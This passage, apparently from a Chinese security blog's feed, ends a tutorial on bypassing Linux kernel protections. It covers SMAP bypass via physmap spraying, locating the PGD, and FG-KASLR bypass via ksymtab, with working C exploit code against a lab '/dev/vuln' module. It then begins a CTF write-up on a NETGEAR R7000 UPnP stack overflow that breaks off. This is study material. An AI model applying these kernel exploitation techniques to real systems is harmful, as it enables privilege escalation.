punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] number of pages allocated: %d\n"</span><span class="token punctuation">,</span> cnt<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过实验得出结论就是尽管RAM很小，但是最大mmap的值是它的数倍，同时该值会根据内存资源的大小来发生变化。同时物理页的分配有一个特点，<strong>那就是它们一般都是连续分配的</strong>。如此通过大量的mmap地址并填充信息，最终其实是可以在内核里面访问到这些信息的，如此就可以绕过SMAP的保护，因为我们不需要再解析用户态的指针，而是通过内核地址进行代码执行。</p><p>​        那么应该如何获得物理地址呢？通过<a href="https://www.kernel.org/doc/gorman/html/understand/understand006.html">文档</a>发现，在Linux中每一个进程都维护一个指针<code>mm_struct-&gt;pgd</code>指向该进程的**Page Global Directory (PGD)**，表里面包含的是<code>pgd_t</code>数组，pgd_t定义在<code>asm/page.h</code>里面根据不同的架构拥有不同的值，在x86架构下<code>mm_struct-&gt;pgd</code>会被复制到cr3寄存器。</p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image-20220321164429738.png" alt="image-20220321164429738"></p><p>​        可以知道通过mmap拿到的是虚拟地址，因此需要做一个虚拟地址到屋里地址之间的转换，那么如何获取cr3或者说pgd的值呢，一方面可以通过内核获取另一方面可以通过<code>/proc/(pid)/pagemap</code>获取，还有一种很奇特的方法即是通过映射64bit的[39:48]形成的地址，这里一共是0xff个地址，此时在物理页表中就会生成大量稠密的地址，这些地址会有一些特征，比如：</p><ol><li>最高位为1。</li><li>最低字节为0x67。</li></ol><p>那么就可以通过遍历内核地址（一般从pageOffsetBase + (0x7c000 &lt;&lt; 12)开始）中的值来判断是否符合自己刚才通过spraying注入的大量地址，如果一个地址的内容符合自己注入的地址，同时索引0x100的结果为0，那么基本就能确定PGD的地址了。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/fcntl.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">VULN_READ</span> <span class="token expression"><span class="token number">0x1111</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">VULN_WRITE</span> <span class="token expression"><span class="token number">0x2222</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">VULN_STACK</span> <span class="token expression"><span class="token number">0x3333</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">VULN_PGD</span> <span class="token expression"><span class="token number">0x4444</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">VULN_PB</span> <span class="token expression"><span class="token number">0x5555</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SPRAY_CNT</span> <span class="token expression"><span class="token number">0x10000</span></span></span><span class="token keyword">struct</span> <span class="token class-name">rwRequest</span> <span class="token punctuation">{</span><span class="token keyword">void</span> <span class="token operator">*</span>kaddr<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token operator">*</span>uaddr<span class="token punctuation">;</span><span class="token class-name">size_t</span> length<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> pageOffsetBase <span class="token operator">=</span> <span class="token number">0xffff888000000000</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">Open</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>fname<span class="token punctuation">,</span> <span class="token keyword">int</span> mode<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">int</span> fd<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span> mode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> fd<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">write64</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> kaddr<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">struct</span> <span class="token class-name">rwRequest</span> req<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> value_ <span class="token operator">=</span> value<span class="token punctuation">;</span>req<span class="token punctuation">.</span>uaddr <span class="token operator">=</span> <span class="token operator">&amp;</span>value_<span class="token punctuation">;</span>req<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>req<span class="token punctuation">.</span>kaddr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>kaddr<span class="token punctuation">;</span><span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"/dev/vuln"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> VULN_WRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"ioctl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> kaddr<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">struct</span> <span class="token class-name">rwRequest</span> req<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> value<span class="token punctuation">;</span><span class="token punctuation">;</span>req<span class="token punctuation">.</span>uaddr <span class="token operator">=</span> <span class="token operator">&amp;</span>value<span class="token punctuation">;</span>req<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>req<span class="token punctuation">.</span>kaddr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>kaddr<span class="token punctuation">;</span><span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"/dev/vuln"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> VULN_READ<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"ioctl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> value<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token function">leak_stack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">struct</span> <span class="token class-name">rwRequest</span> req<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> stack<span class="token punctuation">;</span><span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"/dev/vuln"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>req<span class="token punctuation">.</span>uaddr <span class="token operator">=</span> <span class="token operator">&amp;</span>stack<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> VULN_STACK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"ioctl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> stack<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token function">leak_pgd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">struct</span> <span class="token class-name">rwRequest</span> req<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> pgd <span class="token operator">=</span> <span class="token number">0xcccccccc</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"/dev/vuln"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>req<span class="token punctuation">.</span>uaddr <span class="token operator">=</span> <span class="token operator">&amp;</span>pgd<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> VULN_PGD<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"ioctl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> pgd<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token function">leak_physmap_base</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">struct</span> <span class="token class-name">rwRequest</span> req<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> pgd <span class="token operator">=</span> <span class="token number">0xcccccccc</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"/dev/vuln"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>req<span class="token punctuation">.</span>uaddr <span class="token operator">=</span> <span class="token operator">&amp;</span>pgd<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> VULN_PB<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"ioctl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> pgd<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">check_page</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> addr<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> page<span class="token punctuation">[</span><span class="token number">0x101</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x101</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>page<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>page<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0x67</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>page<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;&gt;</span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">return</span> page<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span> <span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">void</span> <span class="token operator">*</span>pg<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> search_addr<span class="token punctuation">;</span>search_addr <span class="token operator">=</span> pageOffsetBase <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x7c000</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>pg <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">&lt;&lt;</span> <span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> PROT_READ<span class="token operator">|</span>PROT_WRITE<span class="token punctuation">,</span> MAP_POPULATE<span class="token operator">|</span>MAP_PRIVATE<span class="token operator">|</span>MAP_ANONYMOUS<span class="token operator">|</span>MAP_FIXED<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pg <span class="token operator">==</span> MAP_FAILED<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"mmap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] starting search from addr %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>search_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check_page</span><span class="token punctuation">(</span>search_addr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] located the PGD: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>search_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span>search_addr <span class="token operator">+=</span> <span class="token number">0x1000</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] this is the actual PGD: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">leak_pgd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​        如此可以在用户空间通过大量的mmap，然后拿到其物理地址，然后通过内核态的地址转换将该物理地址转换为内核的虚拟地址通过kernel module进行读取就会发现内核可以读取到用户态的数据。</p><p>​        如此就知道绕过的原理了，总结一下就是通过内核空间和用户空间确定相同的物理页然后让kernel进行代码执行。</p><h3 id="KASLR-bypass"><a href="#KASLR-bypass" class="headerlink" title="KASLR bypass"></a>KASLR bypass</h3><p>​        KASLR其实就是内核态的地址随机化，类似用户态的做法，bypass可以通过确定基地址然后加上固定偏移来解决。但是观察<code>/proc/kallsyms</code>的内容发现一些符号其实是完全自己在随机，而不是拥有一个固定的偏移，这就引出了Linux Kernel的一个机制<a href="https://lwn.net/Articles/824307/">Function Granular KASLR</a>，简单来说就是内核在加载的时候会以函数级别重新排布内核代码。</p><p>​        但是FG-KASLR并不完善，一些内核区域并不会随机化：</p><ol><li>不幸，commit_creds 和 prepare_kernel_cred在FG-KASLR的区域。</li><li>swapgs_restore_regs_and_return_to_usermode和__x86_retpoline_r15函数不受到FG-KASLR影响，这能帮助找到一些gadget。</li><li>内核符号表ksymtab不受影响，这里存储了一些偏移可以用于计算prepare_kernel_cred和commit_creds的地址。</li></ol><p>​        第三个比较感兴趣：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">kernel_symbol</span> <span class="token punctuation">{</span>  <span class="token keyword">int</span> value_offset<span class="token punctuation">;</span>  <span class="token keyword">int</span> name_offset<span class="token punctuation">;</span>  <span class="token keyword">int</span> namespace_offset<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出<code>value_offset</code>应该是比较有趣的，这个对应的值也可以通过<code>/proc/kallsyms</code>获取：</p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image-20220323092910382.png" alt="image-20220323092910382"></p><p>因此一般就可以在ROP中利用任意读读出相对应的偏移用于计算其它函数的具体位置。</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>​        网上看到一段总结，感觉很不错：</p><ol><li>如果内核没有保护，就直接ret2usr。</li><li>如果开了SMEP，就用ROP</li><li>溢出或者位置被限制在栈上，就用pivot gadget进行栈迁移。</li><li>KPTI利用KPTI trampoline或者signal handler</li><li>SMAP会导致stack pivot很难利用</li><li>如果没有KASLR，直接泄露地址就能用，开了的话就用基地址 + 偏移。</li><li>如果有FG-KASLR，记得利用ksymtab和不受影响的区域。</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/</a></p><p><a href="https://github.com/pr0cf5/kernel-exploit-practice">https://github.com/pr0cf5/kernel-exploit-practice</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux-Kernel-保护机制绕过&quot;&gt;&lt;a href=&quot;#Linux-Kernel-保护机制绕过&quot; class=&quot;headerlink&quot; title=&quot;Linux Kernel 保护机制绕过&quot;&gt;&lt;/a&gt;Linux Kernel 保护机制绕过&lt;/h1&gt;&lt;bloc</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://rainsec.cn/categories/Linux-Kernel/"/>
    
    
    <category term="Linux Kernel" scheme="https://rainsec.cn/tags/Linux-Kernel/"/>
    
  </entry>
  
  <entry>
    <title>西湖论剑WriteUP - Upnp</title>
    <link href="https://rainsec.cn/post/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Upnp.html"/>
    <id>https://rainsec.cn/post/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Upnp.html</id>
    <published>2022-04-18T10:38:45.000Z</published>
    <updated>2023-04-18T12:01:00.791Z</updated>
    
    <content type="html"><![CDATA[<h1 id="西湖论剑WriteUP-Upnp"><a href="#西湖论剑WriteUP-Upnp" class="headerlink" title="西湖论剑WriteUP - Upnp"></a>西湖论剑WriteUP - Upnp</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次应该是以一个NETGEAR R7000路由器的nDay为基础出的题，当时还在想是不是要挖上面的UPnP的0Day，没有意识到需要进行信息收集找相关漏洞分析。后面放出提示才意识到思路错了，在<a href="https://blog.grimm-co.com/2022/04/no-hardware-no-problem-emulation-and.html">No Hardware, No Problem: Emulation and Exploitation (grimm-co.com)</a>中所提到的漏洞就是这次题目的目标</p><p>后面自己又仔细看了看UPnP的协议，再来复现这个题目</p><h2 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h2><p>通过提示<code>SOAP firmware upgrade checking ... 附近</code>和文章提到的漏洞位置，在upnp服务端的固件更新逻辑部分出现了溢出，后面也是通过字符串索引定位到了溢出位置：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230418/image-20230307144314888.yy6tq8hq480.webp"></p><p>在进行memcpy时没有对大小v9进行限制，而v9是通过传入的固件中的数据所计算出来的，即v9可控那么这里就会造成栈溢出；这个漏洞很简单但是问题来了：这个UPnP功能定义在哪？怎么触发？(即逆向回溯)</p><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p>根据一般的UPnP协议，其提供的服务都会在.XML文件中写明，但是在www文件加下搜索<code>firmware update</code>相关字符串毫无结果。所以这个固件更新功能是内部API，也许其用法写在开发文档中，<strong>那么只能逆出调用该API的UPnP数据包格式</strong>。虽然是个内部API但是估计也是基于UPnP control包的格式开发的：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230418/image-20230307151910532.21ramsdahm8w.webp"></p><p>那么对<code>SOAPACTION</code>交叉索引定位到如下函数：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230418/image-20230307152213758.5ilah3tdi1g0.webp"></p><p>显然这是用来对http包中的SOAPACTION定位的，那么继续查看调用该函数的地方(<strong>对于不同URL提供不同服务，很有可能存在一个集中处理URL的位置</strong>)：</p><p><img 